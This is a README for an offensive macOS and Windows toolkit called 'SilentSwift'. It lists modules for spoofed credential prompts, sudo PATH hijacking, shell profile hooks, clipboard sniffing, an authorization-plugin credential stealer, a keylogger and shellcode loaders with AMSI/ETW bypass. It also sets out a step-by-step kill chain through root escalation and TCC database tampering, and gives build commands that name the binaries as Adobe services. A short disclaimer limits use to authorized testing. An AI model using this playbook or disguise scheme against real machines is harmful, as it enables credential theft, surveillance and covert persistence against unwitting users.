# SilentSwift

macOS & Windows red team toolkit — credential capture, keylogging, shellcode loading, and persistence.

## Structure

```
SilentSwift/
├── credential-capture/          # macOS privilege escalation & cred harvesting
│   ├── finder-dialog/           # Finder-spoofed osascript prompts + dscl validation
│   ├── privileged-helper-spoof/ # SentinelOne technique — spoof real helper tools
│   ├── dock-impersonation/      # Swap Dock apps with trojanized bundles
│   ├── sudo-hijack/             # PATH-based sudo interception (zero UI)
│   ├── profile-injection/       # .zshrc/.bash_profile sudo hook injection
│   ├── clipboard-sniffer/       # Zero-TCC clipboard monitoring (catches pw managers)
│   └── auth-plugin/             # Authorization Plugin for persistent cred capture (post-root)
├── keylogger/                   # Swift CGEventTap keylogger with app context tracking
├── loaders/                     # Shellcode loaders
│   ├── macos/                   # Go loader — mmap/mprotect, AES-256, sandbox evasion
│   └── windows/                 # Go loader — AMSI/ETW bypass, Early Bird APC injection
├── stagers/                     # First-stage downloaders
│   ├── macos_stager.sh          # Bash — anti-sandbox, LaunchAgent persistence
│   └── windows_stager.ps1      # PowerShell — AMSI bypass, scheduled task persistence
├── deployment/                  # Deployment scripts for on-target compilation
└── docs/                        # Research & operational guides
```

## Credential Capture Techniques

| Technique | TCC Required | UI Visible | Root Required | Persistence |
|-----------|-------------|------------|---------------|-------------|
| Finder Dialog | None | Yes (dialog) | No | No |
| Helper Tool Spoof | None | Yes (dialog) | No | No |
| Dock Impersonation | None | Yes (dialog) | No | Until clicked |
| Sudo PATH Hijack | None | No | No | Yes |
| Profile Injection | None | No | No | Yes |
| Clipboard Sniffer | None | No | No | Via LaunchAgent |
| Auth Plugin | None (post-install) | No | Yes (install) | Yes (login/unlock) |
| Keylogger | Input Monitoring | No | No | Via LaunchAgent |

## Recommended Kill Chain

```
1. Clipboard Sniffer (zero TCC, passive)          → catches pw manager copies
2. Finder Dialog + dscl validation                 → active cred prompt
3. echo $pw | sudo -S                              → escalate to root
4. Install Auth Plugin                             → persistent cred capture on every login
5. Grant TCC via tccutil / TCC.db                  → enable keylogger + screen capture
6. Deploy Keylogger                                → full keystroke logging with app context
```

## Build

### Keylogger (compile on macOS target)
```bash
swiftc -O keylogger/keylogger.swift -o AdobeHelperService
```

### Clipboard Sniffer (compile on macOS target)
```bash
swiftc -O credential-capture/clipboard-sniffer/clipboard_sniffer.swift -o AdobeCloudSync
```

### macOS Loader (cross-compile from Linux with osxcross, or build on macOS)
```bash
GOOS=darwin GOARCH=amd64 CGO_ENABLED=1 go build -ldflags="-s -w" -o loader loaders/macos/loader.go
```

### Windows Loader
```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o loader.exe loaders/windows/loader.go
```

### Auth Plugin (on macOS, requires Xcode CLT)
```bash
clang -bundle -framework Security -framework Foundation \
  -o AuthPlugin.bundle/Contents/MacOS/AuthPlugin \
  credential-capture/auth-plugin/auth_plugin.m
```

## References

- [SentinelOne: Spoofing Privileged Helpers](https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/)
- [SentinelOne: Calling Apple APIs Without Binaries](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)
- [SpecterOps: Persistent Credential Theft with Auth Plugins](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [HackTricks: macOS Privilege Escalation](https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-privilege-escalation)

## Disclaimer

For authorized security testing and research only. Obtain written permission before use.
